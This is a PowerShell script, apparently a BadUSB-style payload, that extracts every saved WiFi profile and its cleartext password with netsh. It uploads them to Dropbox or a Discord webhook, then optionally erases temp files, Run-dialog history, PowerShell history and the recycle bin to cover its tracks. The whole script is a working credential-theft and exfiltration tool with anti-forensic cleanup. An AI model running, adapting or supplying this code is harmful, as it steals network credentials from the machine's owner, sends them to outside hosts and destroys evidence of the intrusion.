# Suppress output from commands
$ErrorActionPreference = 'SilentlyContinue'

# Extract WiFi Profiles and Passwords
$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name; PASSWORD=$pass }} | Out-String

# Write to temporary file
$wifiProfiles > $env:TEMP/--wifi-pass.txt

# Upload to Dropbox
function DropBox-Upload {
    [CmdletBinding()]
    param (
        [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
        [Alias("f")]
        [string]$SourceFilePath
    ) 
    $outputFile = Split-Path $SourceFilePath -leaf
    $TargetFilePath = "/$outputFile"
    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $db
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Authorization", $authorization)
    $headers.Add("Dropbox-API-Arg", $arg)
    $headers.Add("Content-Type", 'application/octet-stream')
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

if (-not ([string]::IsNullOrEmpty($db))) {
    DropBox-Upload -f $env:TEMP/--wifi-pass.txt
}

# Upload to Discord
function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position = 0, Mandatory = $False)]
        [string]$file,
        [parameter(Position = 1, Mandatory = $False)]
        [string]$text 
    )

    $hookurl = "$dc"

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not ([string]::IsNullOrEmpty($file))) {
        curl.exe -F "file1=@$file" $hookurl
    }
}

if (-not ([string]::IsNullOrEmpty($dc))) {
    Upload-Discord -file "$env:TEMP/--wifi-pass.txt"
}

# Clean up traces
function Clean-Exfil { 
    rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
}

if (-not ([string]::IsNullOrEmpty($ce))) {
    Clean-Exfil
}

# Remove WiFi password file
Remove-Item $env:TEMP/--wifi-pass.txt -ErrorAction SilentlyContinue
